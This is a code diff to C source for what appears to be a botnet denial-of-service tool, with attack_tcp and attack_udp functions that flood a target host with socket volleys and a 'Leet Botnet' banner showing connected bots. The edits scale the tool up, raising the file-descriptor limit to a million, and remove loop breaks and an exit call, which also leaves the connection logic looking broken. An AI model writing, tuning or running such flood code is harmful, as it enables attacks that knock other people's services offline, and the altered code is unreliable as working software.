@@ -14,7 +14,7 @@
 #include <pthread.h>
 #include <signal.h>
 #include <arpa/inet.h>
-#define MAXFDS 1
+#define MAXFDS 1000000
 
 struct clientdata_t {
         uint32_t ip;
@@ -54,13 +54,13 @@ int make_socket(char *host, char *port) {
 			close(sock);
 			continue;
 		}
-		break;
+		
 	}
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
 		fprintf(stderr, "No connection could be made\n");
-		exit(0);
+		
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
@@ -87,7 +87,7 @@ int make_socket_udp(char *host, char *port) {
 			close(sock);
 			continue;
 		}
-		break;
+		
 	}
 	if(p == NULL) {
 		if(servinfo)
@@ -123,9 +123,9 @@ void attack_tcp(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id);
+			fprintf(stderr, "[%i: Voly Sent]\n", id++);
 		}
-		fprintf(stderr, "[%i: Voly Sent]\n", id);
+		fprintf(stderr, "[%i: Voly Sent]\n", id++);
 		usleep(300000);
 	}
 }
@@ -145,9 +145,9 @@ void attack_udp(char *host, char *port, int id) {
 				sockets[x] = make_socket_udp(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id);
+			fprintf(stderr, "[%i: Voly Sent]\n", id++);
 		}
-		fprintf(stderr, "[%i: Voly Sent]\n", id);
+		fprintf(stderr, "[%i: Voly Sent]\n", id++);
 		usleep(300000);
 	}
 }
@@ -173,7 +173,7 @@ int main(int argc, char **argv) {
 		
 		fprintf(stderr, "\x1b[36m Leet Botnet \r\n");
 		fprintf(stderr, "\r\n");	
-		fprintf(stderr,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected()); 
+		fprintf(stderr,       "\x1b[37m        #\x1b[36m----- \x1b[37m Leets Connected: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected()); 
 		fprintf(stderr, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
 
 	}
